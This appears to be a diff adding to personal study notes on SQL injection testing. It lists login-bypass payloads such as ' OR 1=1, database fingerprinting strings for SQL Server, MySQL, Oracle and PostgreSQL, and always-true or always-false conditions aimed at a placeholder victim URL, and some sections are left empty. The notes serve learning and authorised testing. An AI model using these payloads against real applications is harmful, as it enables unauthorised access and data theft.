@@ -42,9 +42,13 @@
 
 ### 1. Differentinating Number and Strings
 
+- Number not in quote
+- Else in quote.
+
 ### 2. Inline SQL Injection
 
 - SELECT * FROM administrators WHERE
+
 + username= '' AND password = '' -> Default
 + username = ''' AND password = '' -> Test with single-quote
 + username= '' OR 1=1 AND password = '' -> return record with blank password or username
@@ -52,7 +56,27 @@
 + username= 'admin' OR (1=1 AND password = '') -> Return only record for username = admin
 + username= '' AND password = '' OR 1=1 -> return all, always true
 
+- SELECT * FROM messages WHERE uid=45 ORDER BY recieved;
+https://www.victim.com/messages/list.aspx?uid=45
+
+- Testing queries
+
+Inline string
++ 'ab'='a'+'b' -> Microsoft SQL Server
++ 'ab' = 'a''b' -> MySQL
++ 'ab' = 'a'||'b' -> Oracle and PostgreSQL
+
+Inline Numeric
++ 1+1 -> If success, it return record for 2
++ val+0 -> If success, it return record for val
+
+Condition
++ OR 1=1 -> Always true
++ AND 1=2 -> Always false
+
 ### 3. Terminating SQL injection
+
+- 
 
 ### 4. Time Delays
 
